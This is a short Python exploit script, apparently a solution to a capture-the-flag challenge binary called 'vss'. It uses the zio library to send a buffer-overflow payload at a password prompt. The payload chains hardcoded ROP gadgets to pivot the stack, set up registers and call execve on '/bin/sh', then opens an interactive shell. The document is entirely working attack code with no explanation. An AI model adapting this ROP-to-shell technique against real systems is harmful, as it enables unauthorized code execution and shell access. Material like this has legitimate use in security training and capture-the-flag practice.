from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './vss_72e30bb98bdfbf22307133c16f8c9966'
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
io.gdb_hint([0x4011b0])

# gadgets
add_rsp = 0x0046f205    # add rsp, 0x58 ; ret
pop_rsi = 0x00401937    # pop rsi       ; ret
pop_rdx = 0x0043ae05    # pop rdx       ; ret
pop_r12 = 0x004004c3    # pop r12       ; ret
pop_rax = 0x0046f208    # pop rax       ; ret
mov_rdi = 0x00495968    # mov rdi, rsp  ; call r12
syscall = 0x004004b8    # syscall

payload =   'py' + 'A' * 70
payload +=  l64(add_rsp)
payload =   payload.ljust(0x58, 'A')
payload +=  l64(pop_rsi)
payload +=  l64(0)
payload +=  l64(pop_rdx)
payload +=  l64(0)
payload +=  l64(pop_r12)
payload +=  l64(syscall)
payload +=  l64(pop_rax)
payload +=  l64(0x3b)
payload +=  l64(mov_rdi)
payload +=  '/bin/sh\x00'

io.read_until('Password:')
io.writeline(payload)

io.interact()
